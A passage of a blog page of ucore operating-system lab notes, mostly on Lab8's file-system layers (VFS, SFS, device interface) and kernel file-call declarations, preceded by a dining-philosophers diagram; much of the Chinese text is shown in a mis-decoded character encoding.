&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">å“²å­¦å®¶-&gt;è¯•è¯•æ‹¿åˆ€å‰-&gt;èƒ½æ‹¿-&gt;signal å”¤é†’è¢«waité˜»å¡çš„è¿›ç¨‹-&gt;é˜»å¡è‡ªå·±<br>                  |             |                   A<br>                  |             V                   |<br>                  -&gt;ä¸èƒ½æ‹¿-&gt;waité˜»å¡è‡ªå·±             |<br>                                                    |<br>å“²å­¦å®¶-&gt;æ”¾åˆ€å‰-&gt;è®©å·¦å³ä¸¤è¾¹è¯•è¯•æ‹¿åˆ€å‰-&gt;æœ‰å“²å­¦å®¶ç¡åœ¨signal å”¤é†’ä»–<br></code></pre></div></td></tr></table></figure><blockquote><p>è¯·åœ¨å®éªŒæŠ¥å‘Šä¸­å›ç­”ï¼šèƒ½å¦ä¸ç”¨åŸºäºä¿¡å·é‡æœºåˆ¶æ¥å®Œæˆæ¡ä»¶å˜é‡ï¼Ÿå¦‚æœä¸èƒ½ï¼Œè¯·ç»™å‡ºç†ç”±ï¼Œå¦‚æœèƒ½ï¼Œè¯·ç»™å‡ºè®¾è®¡è¯´æ˜å’Œå…·ä½“å®ç°ã€‚</p></blockquote><p>è‡ªæ—‹é”.</p></div><h1 id="Lab8"><a href="#Lab8" class="headerlink" title="Lab8"></a>Lab8</h1><h2 id="çŸ¥è¯†ç‚¹-7"><a href="#çŸ¥è¯†ç‚¹-7" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="0-é¡¹ç›®ç»“æ„-1"><a href="#0-é¡¹ç›®ç»“æ„-1" class="headerlink" title="0.é¡¹ç›®ç»“æ„"></a>0.é¡¹ç›®ç»“æ„</h3><p>æœ¬æ¬¡å®éªŒä¸»è¦æ˜¯ç†è§£kern/fsç›®å½•ä¸­çš„éƒ¨åˆ†æ–‡ä»¶ï¼Œå¹¶å¯ç”¨user/*.cæµ‹è¯•æ‰€å®ç°çš„Simple FSæ–‡ä»¶ç³»ç»Ÿæ˜¯å¦èƒ½å¤Ÿæ­£å¸¸å·¥ä½œã€‚æœ¬æ¬¡å®éªŒæ¶‰åŠåˆ°çš„ä»£ç åŒ…æ‹¬ï¼š</p><ul><li>æ–‡ä»¶ç³»ç»Ÿæµ‹è¯•ç”¨ä¾‹ï¼š user/*.cï¼šå¯¹æ–‡ä»¶ç³»ç»Ÿçš„å®ç°è¿›è¡Œæµ‹è¯•çš„æµ‹è¯•ç”¨ä¾‹ï¼›</li><li>é€šç”¨æ–‡ä»¶ç³»ç»Ÿæ¥å£<br>user/libs/file.[ch] | dir.[ch] | syscall.cï¼šä¸æ–‡ä»¶ç³»ç»Ÿæ“ä½œç›¸å…³çš„ç”¨æˆ·åº“å®è¡Œï¼›<br>kern/syscall.[ch]ï¼šæ–‡ä»¶ä¸­åŒ…å«æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„å†…æ ¸æ€ç³»ç»Ÿè°ƒç”¨æ¥å£<br>kern/fs/sysfile.[ch]|file.[ch]ï¼šé€šç”¨æ–‡ä»¶ç³»ç»Ÿæ¥å£å’Œå®è¡Œ</li><li>æ–‡ä»¶ç³»ç»ŸæŠ½è±¡å±‚-VFS<br>kern/fs/vfs/*.[ch]ï¼šè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿæ¥å£ä¸å®ç°</li><li>Simple FSæ–‡ä»¶ç³»ç»Ÿ<br>kern/fs/sfs/*.[ch]ï¼šSimpleFSæ–‡ä»¶ç³»ç»Ÿå®ç°</li><li>æ–‡ä»¶ç³»ç»Ÿçš„ç¡¬ç›˜IOæ¥å£<br>kern/fs/devs/dev.[ch] | dev_disk0.cï¼šdisk0ç¡¬ç›˜è®¾å¤‡æä¾›ç»™æ–‡ä»¶ç³»ç»Ÿçš„I/Oè®¿é—®æ¥å£å’Œå®ç°</li><li>è¾…åŠ©å·¥å…·<br>tools/mksfs.cï¼šåˆ›å»ºä¸€ä¸ªSimple FSæ–‡ä»¶ç³»ç»Ÿæ ¼å¼çš„ç¡¬ç›˜é•œåƒã€‚ï¼ˆ<strong>ç†è§£æ­¤æ–‡ä»¶çš„å®ç°ç»†èŠ‚å¯¹ç†è§£SFSæ–‡ä»¶ç³»ç»Ÿå¾ˆæœ‰å¸®åŠ©</strong>ï¼‰</li><li>å¯¹å†…æ ¸å…¶å®ƒæ¨¡å—çš„æ‰©å……<br>kern/process/proc.[ch]ï¼šå¢åŠ æˆå‘˜å˜é‡ struct fs_struct *fs_structï¼Œç”¨äºæ”¯æŒè¿›ç¨‹å¯¹æ–‡ä»¶çš„è®¿é—®ï¼›é‡å†™äº†do_execve load_icodeç­‰å‡½æ•°ä»¥æ”¯æŒæ‰§è¡Œæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ã€‚<br>kern/init/init.cï¼šå¢åŠ è°ƒç”¨åˆå§‹åŒ–æ–‡ä»¶ç³»ç»Ÿçš„å‡½æ•°fs_initã€‚</li></ul><h3 id="1-ucoreæ–‡ä»¶ç³»ç»Ÿæ¦‚è¿°"><a href="#1-ucoreæ–‡ä»¶ç³»ç»Ÿæ¦‚è¿°" class="headerlink" title="1.ucoreæ–‡ä»¶ç³»ç»Ÿæ¦‚è¿°"></a>1.ucoreæ–‡ä»¶ç³»ç»Ÿæ¦‚è¿°</h3><p>ucoreçš„æ–‡ä»¶ç³»ç»Ÿæ¨¡å‹æºäºHavardçš„OS161çš„æ–‡ä»¶ç³»ç»Ÿå’ŒLinuxæ–‡ä»¶ç³»ç»Ÿã€‚ä½†å…¶å®è¿™äºŒè€…éƒ½æ˜¯æºäºä¼ ç»Ÿçš„UNIXæ–‡ä»¶ç³»ç»Ÿè®¾è®¡ã€‚UNIXæå‡ºäº†å››ä¸ªæ–‡ä»¶ç³»ç»ŸæŠ½è±¡æ¦‚å¿µï¼šæ–‡ä»¶(file)ã€ç›®å½•é¡¹(dentry)ã€ç´¢å¼•èŠ‚ç‚¹(inode)å’Œå®‰è£…ç‚¹(mount point)ã€‚</p><ul><li><strong>æ–‡ä»¶</strong>ï¼šUNIXæ–‡ä»¶ä¸­çš„å†…å®¹å¯ç†è§£ä¸ºæ˜¯ä¸€æœ‰åºå­—èŠ‚bufferï¼Œæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªæ–¹ä¾¿åº”ç”¨ç¨‹åºè¯†åˆ«çš„æ–‡ä»¶åç§°ï¼ˆä¹Ÿç§°æ–‡ä»¶è·¯å¾„åï¼‰ã€‚å…¸å‹çš„æ–‡ä»¶æ“ä½œæœ‰è¯»ã€å†™ã€åˆ›å»ºå’Œåˆ é™¤ç­‰ã€‚</li><li><strong>ç›®å½•é¡¹</strong>ï¼šç›®å½•é¡¹ä¸æ˜¯ç›®å½•ï¼ˆåˆç§°æ–‡ä»¶è·¯å¾„ï¼‰ï¼Œè€Œæ˜¯ç›®å½•çš„ç»„æˆéƒ¨åˆ†ã€‚åœ¨UNIXä¸­ç›®å½•è¢«çœ‹ä½œä¸€ç§ç‰¹å®šçš„æ–‡ä»¶ï¼Œè€Œç›®å½•é¡¹æ˜¯æ–‡ä»¶è·¯å¾„ä¸­çš„ä¸€éƒ¨åˆ†ã€‚å¦‚ä¸€ä¸ªæ–‡ä»¶è·¯å¾„åæ˜¯â€œ/test/testfileâ€ï¼Œåˆ™åŒ…å«çš„ç›®å½•é¡¹ä¸ºï¼šæ ¹ç›®å½•â€œ/â€ï¼Œç›®å½•â€œtestâ€å’Œæ–‡ä»¶â€œtestfileâ€ï¼Œè¿™ä¸‰ä¸ªéƒ½æ˜¯ç›®å½•é¡¹ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œç›®å½•é¡¹åŒ…å«ç›®å½•é¡¹çš„åå­—ï¼ˆæ–‡ä»¶åæˆ–ç›®å½•åï¼‰å’Œç›®å½•é¡¹çš„ç´¢å¼•èŠ‚ç‚¹ï¼ˆè§ä¸‹é¢çš„æè¿°ï¼‰ä½ç½®ã€‚</li><li><strong>ç´¢å¼•èŠ‚ç‚¹</strong>ï¼šUNIXå°†æ–‡ä»¶çš„ç›¸å…³å…ƒæ•°æ®ä¿¡æ¯ï¼ˆå¦‚è®¿é—®æ§åˆ¶æƒé™ã€å¤§å°ã€æ‹¥æœ‰è€…ã€åˆ›å»ºæ—¶é—´ã€æ•°æ®å†…å®¹ç­‰ç­‰ä¿¡æ¯ï¼‰å­˜å‚¨åœ¨ä¸€ä¸ªå•ç‹¬çš„æ•°æ®ç»“æ„ä¸­ï¼Œè¯¥ç»“æ„è¢«ç§°ä¸ºç´¢å¼•èŠ‚ç‚¹ã€‚</li><li><strong>å®‰è£…ç‚¹</strong>ï¼šåœ¨UNIXä¸­ï¼Œæ–‡ä»¶ç³»ç»Ÿè¢«å®‰è£…åœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡ä»¶è·¯å¾„ä½ç½®ï¼Œè¿™ä¸ªä½ç½®å°±æ˜¯å®‰è£…ç‚¹ã€‚æ‰€æœ‰çš„å·²å®‰è£…æ–‡ä»¶ç³»ç»Ÿéƒ½ä½œä¸ºæ ¹æ–‡ä»¶ç³»ç»Ÿæ ‘ä¸­çš„å¶å­å‡ºç°åœ¨ç³»ç»Ÿä¸­ã€‚</li></ul><p>ä¸Šè¿°æŠ½è±¡æ¦‚å¿µå½¢æˆäº†UNIXæ–‡ä»¶ç³»ç»Ÿçš„é€»è¾‘æ•°æ®ç»“æ„ï¼Œå¹¶éœ€è¦é€šè¿‡ä¸€ä¸ªå…·ä½“æ–‡ä»¶ç³»ç»Ÿçš„æ¶æ„è®¾è®¡ä¸å®ç°æŠŠä¸Šè¿°ä¿¡æ¯æ˜ å°„å¹¶å‚¨å­˜åˆ°ç£ç›˜ä»‹è´¨ä¸Šï¼Œä»è€Œåœ¨å…·ä½“æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜å¸ƒå±€ï¼ˆå³æ•°æ®åœ¨ç£ç›˜ä¸Šçš„ç‰©ç†ç»„ç»‡ï¼‰ä¸Šå…·ä½“ä½“ç°å‡ºä¸Šè¿°æŠ½è±¡æ¦‚å¿µã€‚æ¯”å¦‚æ–‡ä»¶å…ƒæ•°æ®ä¿¡æ¯å­˜å‚¨åœ¨ç£ç›˜å—ä¸­çš„ç´¢å¼•èŠ‚ç‚¹ä¸Šã€‚å½“æ–‡ä»¶è¢«è½½å…¥å†…å­˜æ—¶ï¼Œå†…æ ¸éœ€è¦ä½¿ç”¨ç£ç›˜å—ä¸­çš„ç´¢å¼•ç‚¹æ¥æ„é€ å†…å­˜ä¸­çš„ç´¢å¼•èŠ‚ç‚¹ã€‚</p><p>ucoreæ¨¡ä»¿äº†UNIXçš„æ–‡ä»¶ç³»ç»Ÿè®¾è®¡ï¼Œucoreçš„æ–‡ä»¶ç³»ç»Ÿæ¶æ„ä¸»è¦ç”±å››éƒ¨åˆ†ç»„æˆï¼š</p><ul><li><strong>é€šç”¨æ–‡ä»¶ç³»ç»Ÿè®¿é—®æ¥å£å±‚</strong>ï¼šè¯¥å±‚æä¾›äº†ä¸€ä¸ªä»ç”¨æˆ·ç©ºé—´åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æ ‡å‡†è®¿é—®æ¥å£ã€‚è¿™ä¸€å±‚è®¿é—®æ¥å£è®©åº”ç”¨ç¨‹åºèƒ½å¤Ÿé€šè¿‡ä¸€ä¸ªç®€å•çš„æ¥å£è·å¾—ucoreå†…æ ¸çš„æ–‡ä»¶ç³»ç»ŸæœåŠ¡ã€‚</li><li><strong>æ–‡ä»¶ç³»ç»ŸæŠ½è±¡å±‚</strong>ï¼šå‘ä¸Šæä¾›ä¸€ä¸ªä¸€è‡´çš„æ¥å£ç»™å†…æ ¸å…¶ä»–éƒ¨åˆ†ï¼ˆæ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨å®ç°æ¨¡å—å’Œå…¶ä»–å†…æ ¸åŠŸèƒ½æ¨¡å—ï¼‰è®¿é—®ã€‚å‘ä¸‹æä¾›ä¸€ä¸ªåŒæ ·çš„æŠ½è±¡å‡½æ•°æŒ‡é’ˆåˆ—è¡¨å’Œæ•°æ®ç»“æ„å±è”½ä¸åŒæ–‡ä»¶ç³»ç»Ÿçš„å®ç°ç»†èŠ‚ã€‚</li><li><strong>Simple FSæ–‡ä»¶ç³»ç»Ÿå±‚</strong>ï¼šä¸€ä¸ªåŸºäºç´¢å¼•æ–¹å¼çš„ç®€å•æ–‡ä»¶ç³»ç»Ÿå®ä¾‹ã€‚å‘ä¸Šé€šè¿‡å„ç§å…·ä½“å‡½æ•°å®ç°ä»¥å¯¹åº”æ–‡ä»¶ç³»ç»ŸæŠ½è±¡å±‚æå‡ºçš„æŠ½è±¡å‡½æ•°ã€‚å‘ä¸‹è®¿é—®å¤–è®¾æ¥å£</li><li><strong>å¤–è®¾æ¥å£å±‚</strong>ï¼šå‘ä¸Šæä¾›deviceè®¿é—®æ¥å£å±è”½ä¸åŒç¡¬ä»¶ç»†èŠ‚ã€‚å‘ä¸‹å®ç°è®¿é—®å„ç§å…·ä½“è®¾å¤‡é©±åŠ¨çš„æ¥å£ï¼Œæ¯”å¦‚diskè®¾å¤‡æ¥å£/ä¸²å£è®¾å¤‡æ¥å£/é”®ç›˜è®¾å¤‡æ¥å£ç­‰ã€‚</li></ul><p>æ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®å¤„ç†è¿‡ç¨‹: å‡å¦‚åº”ç”¨ç¨‹åºæ“ä½œæ–‡ä»¶ï¼ˆæ‰“å¼€/åˆ›å»º/åˆ é™¤/è¯»å†™ï¼‰ï¼Œé¦–å…ˆéœ€è¦é€šè¿‡æ–‡ä»¶ç³»ç»Ÿçš„é€šç”¨æ–‡ä»¶ç³»ç»Ÿè®¿é—®æ¥å£å±‚ç»™ç”¨æˆ·ç©ºé—´æä¾›çš„è®¿é—®æ¥å£è¿›å…¥æ–‡ä»¶ç³»ç»Ÿå†…éƒ¨ï¼Œæ¥ç€ç”±æ–‡ä»¶ç³»ç»ŸæŠ½è±¡å±‚æŠŠè®¿é—®è¯·æ±‚è½¬å‘ç»™æŸä¸€å…·ä½“æ–‡ä»¶ç³»ç»Ÿï¼ˆæ¯”å¦‚SFSæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå…·ä½“æ–‡ä»¶ç³»ç»Ÿï¼ˆSimple FSæ–‡ä»¶ç³»ç»Ÿå±‚ï¼‰æŠŠåº”ç”¨ç¨‹åºçš„è®¿é—®è¯·æ±‚è½¬åŒ–ä¸ºå¯¹ç£ç›˜ä¸Šçš„blockçš„å¤„ç†è¯·æ±‚ï¼Œå¹¶é€šè¿‡å¤–è®¾æ¥å£å±‚äº¤ç»™ç£ç›˜é©±åŠ¨ä¾‹ç¨‹æ¥å®Œæˆå…·ä½“çš„ç£ç›˜æ“ä½œã€‚ç»“åˆç”¨æˆ·æ€å†™æ–‡ä»¶å‡½æ•°writeçš„æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥æ¯”è¾ƒæ¸…æ¥šåœ°çœ‹å‡ºucoreæ–‡ä»¶ç³»ç»Ÿæ¶æ„çš„å±‚æ¬¡å’Œä¾èµ–å…³ç³»ã€‚</p><p><img src="../../image/ucore/image001.png" alt="image"></p><h4 id="è‡ªä¸Šè€Œä¸‹çš„æ•°æ®ç»“æ„"><a href="#è‡ªä¸Šè€Œä¸‹çš„æ•°æ®ç»“æ„" class="headerlink" title="è‡ªä¸Šè€Œä¸‹çš„æ•°æ®ç»“æ„"></a>è‡ªä¸Šè€Œä¸‹çš„æ•°æ®ç»“æ„</h4><p>ä»ucoreæ“ä½œç³»ç»Ÿä¸åŒçš„è§’åº¦æ¥çœ‹ï¼Œucoreä¸­çš„æ–‡ä»¶ç³»ç»Ÿæ¶æ„åŒ…å«å››ç±»ä¸»è¦çš„æ•°æ®ç»“æ„, å®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p><ul><li>è¶…çº§å—ï¼ˆSuperBlockï¼‰ï¼Œå®ƒä¸»è¦ä»æ–‡ä»¶ç³»ç»Ÿçš„å…¨å±€è§’åº¦æè¿°ç‰¹å®šæ–‡ä»¶ç³»ç»Ÿçš„å…¨å±€ä¿¡æ¯ã€‚å®ƒçš„ä½œç”¨èŒƒå›´æ˜¯æ•´ä¸ªOSç©ºé—´ã€‚</li><li>ç´¢å¼•èŠ‚ç‚¹ï¼ˆinodeï¼‰ï¼šå®ƒä¸»è¦ä»æ–‡ä»¶ç³»ç»Ÿçš„å•ä¸ªæ–‡ä»¶çš„è§’åº¦å®ƒæè¿°äº†æ–‡ä»¶çš„å„ç§å±æ€§å’Œæ•°æ®æ‰€åœ¨ä½ç½®ã€‚å®ƒçš„ä½œç”¨èŒƒå›´æ˜¯æ•´ä¸ªOSç©ºé—´ã€‚</li><li>ç›®å½•é¡¹ï¼ˆdentryï¼‰ï¼šå®ƒä¸»è¦ä»æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶è·¯å¾„çš„è§’åº¦æè¿°äº†æ–‡ä»¶è·¯å¾„ä¸­çš„ä¸€ä¸ªç‰¹å®šçš„ç›®å½•é¡¹ï¼ˆæ³¨ï¼šä¸€ç³»åˆ—ç›®å½•é¡¹å½¢æˆç›®å½•/æ–‡ä»¶è·¯å¾„ï¼‰ã€‚å®ƒçš„ä½œç”¨èŒƒå›´æ˜¯æ•´ä¸ªOSç©ºé—´ã€‚å¯¹äºSFSè€Œè¨€ï¼Œinode(å…·ä½“ä¸ºstruct sfs_disk_inode)å¯¹åº”äºç‰©ç†ç£ç›˜ä¸Šçš„å…·ä½“å¯¹è±¡ï¼Œdentryï¼ˆå…·ä½“ä¸ºstruct sfs_disk_entryï¼‰æ˜¯ä¸€ä¸ªå†…å­˜å®ä½“ï¼Œå…¶ä¸­çš„inoæˆå‘˜æŒ‡å‘å¯¹åº”çš„inode numberï¼Œå¦å¤–ä¸€ä¸ªæˆå‘˜æ˜¯file name(æ–‡ä»¶å).</li><li>æ–‡ä»¶ï¼ˆfileï¼‰ï¼Œå®ƒä¸»è¦ä»è¿›ç¨‹çš„è§’åº¦æè¿°äº†ä¸€ä¸ªè¿›ç¨‹åœ¨è®¿é—®æ–‡ä»¶æ—¶éœ€è¦äº†è§£çš„æ–‡ä»¶æ ‡è¯†ï¼Œæ–‡ä»¶è¯»å†™çš„ä½ç½®ï¼Œæ–‡ä»¶å¼•ç”¨æƒ…å†µç­‰ä¿¡æ¯ã€‚å®ƒçš„ä½œç”¨èŒƒå›´æ˜¯æŸä¸€å…·ä½“è¿›ç¨‹ã€‚</li></ul><p>å¦‚æœä¸€ä¸ªç”¨æˆ·è¿›ç¨‹æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨ucoreä¸­æ¶‰åŠçš„ç›¸å…³æ•°æ®ç»“æ„å’Œå…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="../../image/ucore/image-20220105195357089.png" alt="image-20220105195357089"></p><p>understandç”Ÿæˆçš„å…³ç³»å›¾:</p><p><img src="../../image/ucore/image-20220105200433737.png" alt="image-20220105200433737"></p><h3 id="2-ç³»ç»Ÿè®¿é—®æ¥å£å±‚"><a href="#2-ç³»ç»Ÿè®¿é—®æ¥å£å±‚" class="headerlink" title="2.ç³»ç»Ÿè®¿é—®æ¥å£å±‚"></a>2.ç³»ç»Ÿè®¿é—®æ¥å£å±‚</h3><p>ä»ç”¨æˆ·æ€å‡½æ•°syscall-&gt;sys_open(syscall.c)-&gt;sysfile_open(sysfile.c)ä¸­:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;     <span class="hljs-comment">// Open or create a file. FLAGS/MODE per the syscall.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;                                      <span class="hljs-comment">// Close a vnode opened  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len)</span></span>;               <span class="hljs-comment">// Read file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len)</span></span>;              <span class="hljs-comment">// Write file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> pos, <span class="hljs-keyword">int</span> whence)</span></span>;                <span class="hljs-comment">// Seek file  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat *stat)</span></span>;                   <span class="hljs-comment">// Stat file </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_fsync</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;                                      <span class="hljs-comment">// Sync file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_chdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                            <span class="hljs-comment">// change DIR  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_mkdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                            <span class="hljs-comment">// create DIR</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_link</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path2)</span></span>;         <span class="hljs-comment">// set a path1&#x27;s link as path2</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_rename</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path2)</span></span>;       <span class="hljs-comment">// rename file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_unlink</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                           <span class="hljs-comment">// unlink a path</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_getcwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> len)</span></span>;                      <span class="hljs-comment">// get current working directory</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_getdirentry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct dirent *direntp)</span></span>;        <span class="hljs-comment">// get the file entry in DIR </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span></span>;                              <span class="hljs-comment">// duplicate file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *fd_store)</span></span>;                                <span class="hljs-comment">// build PIPE   </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_mkfifo</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;      <span class="hljs-comment">// build named PIPE</span><br></code></pre></div></td></tr></table></figure><p>ç„¶åè°ƒç”¨file.cä¸­å…·ä½“çš„å®ç°:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_open</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">size_t</span> *copied_store)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">size_t</span> *copied_store)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> pos, <span class="hljs-keyword">int</span> whence)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat *stat)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_fsync</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_getdirentry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct dirent *dirent)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_mkfifo</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>sysfile_xxxç®—æ˜¯åœ¨å†™æ“ä½œç³»ç»Ÿçš„æ—¶å€™æ¯”è¾ƒå¸¸ç”¨çš„å‡½æ•°.</p><h3 id="3-VFSå±‚"><a href="#3-VFSå±‚" class="headerlink" title="3.VFSå±‚"></a>3.VFSå±‚</h3><p>VFSæœ‰å››ä¸ªæ¥å£, åˆ†åˆ«æ˜¯file&amp;diræ¥å£, inodeæ¥å£, fsæ¥å£å’Œå¤–è®¾æ¥å£. </p><h4 id="file-amp-diræ¥å£"><a href="#file-amp-diræ¥å£" class="headerlink" title="file&amp;diræ¥å£"></a>file&amp;diræ¥å£</h4><p>file&amp;diræ¥å£å±‚(å…±ç”¨ä¸€ä¸ªç»“æ„ä½“, æ¯•ç«Ÿç›®å½•ä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶)å®šä¹‰äº†è¿›ç¨‹åœ¨å†…æ ¸ä¸­ç›´æ¥è®¿é—®çš„æ–‡ä»¶ç›¸å…³ä¿¡æ¯ï¼Œè¿™å®šä¹‰åœ¨fileæ•°æ®ç»“æ„ä¸­ï¼Œå…·ä½“æè¿°å¦‚ä¸‹ï¼š</p><blockquote><p>å…¶ä¸­fdå–å†³äºè¿›ç¨‹çš„æ–‡ä»¶æ‰“å¼€é¡ºåº, æœ€å¤§å€¼æ˜¯<code>(4096 - sizeof(struct files_struct)) / sizeof(struct file)</code><br>è€Œä¸”åœ¨fd_arrayåˆå§‹åŒ–çš„æ—¶å€™çœ‹èµ·æ¥file_structå’ŒfileæŒ¤æ»¡4KBç©ºé—´, ä¸è¿‡ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 